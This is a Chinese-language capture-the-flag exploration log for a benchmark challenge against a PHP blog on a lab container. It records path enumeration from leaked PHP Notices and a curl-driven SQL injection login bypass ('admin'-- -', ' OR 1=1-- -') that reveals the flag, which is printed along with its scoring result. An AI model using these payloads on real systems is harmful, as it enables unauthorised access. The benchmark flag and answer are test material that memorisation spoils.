# xben-039-24 · 探索记录

对应题解：[`xben-039-24.md`](./xben-039-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，
标题 `Blog Home`。

首页是一个分类下拉框 + 10 篇文章列表。页面里到处是 Notice：

```html
<b>Notice</b>:  Undefined variable: category in <b>/var/www/html/index.php</b> on line <b>28</b><br />
```

每渲染一个 `<option>` 就报一次，共 6 次（All Categories / Nature / Tech / Cooking /
Photography / Health / Secret）。

## 第一阶段：分类筛选是坏的

| category | 文章数 |
| --- | --- |
| `Nature` | 10 |
| `Secret` | 10 |
| `''`（不传） | 10 |

**判据**：筛选完全不生效 → `$category` 未定义，模板写错了变量名。
所以「下拉里有 `Secret` 分类」这条线索是死的，围绕它的 SQLi 试探也都没意义
（`Secret'`、`' OR 1=1-- -` 等返回的都是完整 10 篇，无差异）。

## 第二阶段：顺着路径枚举同目录页面

Notice 暴露了 `/var/www/html/index.php`，于是列出常见同目录页面：

| 路径 | 结果 |
| --- | --- |
| `/index.php` | 200，5666 B |
| **`/admin.php`** | **200，646 B（Admin Login 表单）** |
| **`/flag.php`** | **200，0 B** |
| `/post.php` / `/posts.php` / `/article.php` / `/view.php` / `/search.php` / `/login.php` / `/upload.php` | 404 |
| `/index.php?id=1` / `?post=1` / `?p=1` / `?search=a` / `?cat=Secret` | 全是 5666 B（参数被忽略） |

## 第三阶段：`/flag.php` 是空响应

```bash
curl -i http://$T/flag.php
# HTTP/1.1 200 OK
# Content-Length: 0
```

**判据**：不是 403/404，而是 200 + 空 body → 内部有条件判断，
不满足就静默不输出。

## 第四阶段：`/admin.php` 登录注入

先试常规口令：

| username / password | 结果 |
| --- | --- |
| `admin` / `admin` | 200，702 B，`Invalid` |
| `admin` / `password` | 同上 |
| `admin` / （空） | 同上 |
| 空 / 空 | 同上 |

改用注释截断：

```bash
curl -X POST --data-urlencode "username=admin'-- -" --data-urlencode 'password=x' http://$T/admin.php
```

响应 688 B，正文：

```text
flag{d85575cb-8872-4b2d-b617-b662bfe05086}
```

`' OR 1=1-- -` 同样成功。

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 下拉框的 `Secret` 分类 | 返回全部 10 篇 | 筛选失效（`$category` 未定义） |
| 围绕 `?category=` 做 SQLi | 响应恒为 5666 B | 参数根本没进查询 |
| `index.php` 的 `id`/`post`/`p`/`search` 参数 | 恒为 5666 B | 都被忽略 |
| `/flag.php` 直接请求 | 200 + 0 字节 | 需要登录态/条件，不是无鉴权泄露 |
| `/admin.php` 常见弱口令（5 组） | `Invalid` | 口令不是常见值 |
| **`username=admin'-- -`** | **688 B + flag** | 注释截断生效 |

## 这次真正的收获

1. **PHP Notice 是免费的目录与逻辑情报。** 它既暴露 `/var/www/html/` 这个根，
   又暴露出「`$category` 未定义」这个实现缺陷；顺着同一目录枚举页面就找到了
   `/admin.php` 与 `/flag.php`。
2. **先验证功能是否真的生效，再围绕它投入。** 分类筛选从第一屏就是坏的
   （选什么都是 10 篇），所以 `Secret` 分类这条线索是死的；如果照着它去构造
   SQLi，会白花很多请求。
3. **`200 + 空 body` 意味着"有条件输出"。** 它既不是 403（有文件但被拒），
   也不是 404（无此文件），而是逻辑上前置条件不满足。
4. **注释截断比 `OR 1=1` 更稳。** `admin'-- -` 只命中一行；
   `OR 1=1` 在多行实现里常常因为取第一行以外的数据而出错。
5. **成功与失败只差 14 字节，别靠文案判断。** 失败 702 B / 成功 688 B，
   都含 HTML 外壳；直接 `grep flag{` 最可靠。
